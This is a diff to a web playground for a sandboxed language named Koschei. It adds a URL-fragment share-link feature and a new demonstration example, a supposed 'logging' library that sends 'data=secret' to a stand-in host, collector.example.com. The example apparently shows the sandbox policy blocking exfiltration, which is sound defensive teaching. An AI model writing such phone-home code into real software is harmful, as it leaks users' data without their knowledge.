@@ -24,6 +24,7 @@ textarea{width:100%;min-height:260px;padding:14px;border:1px solid var(--line);b
 pre{margin:0 0 10px;padding:12px 14px;border:1px solid var(--line);border-radius:8px;background:#0a0f12;white-space:pre-wrap;overflow-wrap:anywhere;font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
 .label{margin:12px 0 4px;color:var(--muted);font-size:12px;letter-spacing:.06em;text-transform:uppercase}
 footer{margin-top:28px;color:var(--muted);font-size:13px}
+#shared{color:var(--ok);font-size:13px}
 </style>
 </head>
 <body>
@@ -36,12 +37,15 @@ footer{margin-top:28px;color:var(--muted);font-size:13px}
     <button data-example="hello">Hello</button>
     <button data-example="steal">Read a secret file</button>
     <button data-example="env">Read an API key</button>
+    <button data-example="exfil">Send data to a server</button>
     <button data-example="compute">Pure computation</button>
   </div>
   <textarea id="src" spellcheck="false" aria-label="Koschei source"></textarea>
   <div class="bar" style="margin-top:10px">
     <button id="run" class="primary">Run</button>
     <button id="check">Check only</button>
+    <button id="share">Copy share link</button>
+    <span id="shared" role="status"></span>
   </div>
   <div id="out" aria-live="polite"></div>
   <footer>Programs run on our server under a strict policy: only computation, clock and random are allowed. Time, memory and step limits apply.</footer>
@@ -66,6 +70,14 @@ fn main(caps: SystemCaps) {
     print(e.get("HOME") or "none")
 }
 `,
+exfil:`// A "logging" library that quietly phones home with your data.
+// This is what most real supply-chain attacks do.
+fn main(caps: SystemCaps) {
+    let n = caps.net.allow("https://collector.example.com")
+    let r = n.get("https://collector.example.com/upload?data=secret") or "none"
+    print(r)
+}
+`,
 compute:`fn fib(n: Int) -> Int {
     if n < 2 {
         return n
@@ -79,8 +91,29 @@ fn main() {
 `};
 const src=document.getElementById('src'),out=document.getElementById('out');
 const runBtn=document.getElementById('run'),checkBtn=document.getElementById('check');
-src.value=EXAMPLES.hello;
+// Share links carry the program in the URL fragment, which never reaches the server.
+const encode=s=>{let b='';new TextEncoder().encode(s).forEach(c=>b+=String.fromCharCode(c));return btoa(b).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');};
+const decode=s=>{const b=atob(s.replace(/-/g,'+').replace(/_/g,'/'));return new TextDecoder().decode(Uint8Array.from(b,c=>c.charCodeAt(0)));};
+function fromHash(){
+  const m=location.hash.match(/^#code=([A-Za-z0-9_-]+)$/);
+  if(m){try{src.value=decode(m[1]);return true;}catch(e){}}
+  const ex=location.hash.match(/^#example=(\w+)$/);
+  if(ex&&EXAMPLES[ex[1]]){src.value=EXAMPLES[ex[1]];return true;}
+  return false;
+}
+if(!fromHash())src.value=EXAMPLES.hello;
+// A result belongs to the code that produced it; clear it once the code changes.
+src.addEventListener('input',()=>out.replaceChildren());
+window.addEventListener('hashchange',()=>{if(fromHash())out.replaceChildren();});
 document.querySelectorAll('[data-example]').forEach(b=>b.addEventListener('click',()=>{src.value=EXAMPLES[b.dataset.example];out.replaceChildren();}));
+const shared=document.getElementById('shared');
+document.getElementById('share').addEventListener('click',async()=>{
+  const url=location.origin+location.pathname+'#code='+encode(src.value);
+  history.replaceState(null,'',url);
+  try{await navigator.clipboard.writeText(url);shared.textContent='Link copied.';}
+  catch(e){shared.textContent='Link is in the address bar.';}
+  setTimeout(()=>{shared.textContent='';},4000);
+});
 src.addEventListener('keydown',e=>{if(e.key==='Tab'){e.preventDefault();const s=src.selectionStart;src.setRangeText('    ',s,src.selectionEnd,'end');}
   if(e.key==='Enter'&&(e.ctrlKey||e.metaKey)){e.preventDefault();go('run');}});
 
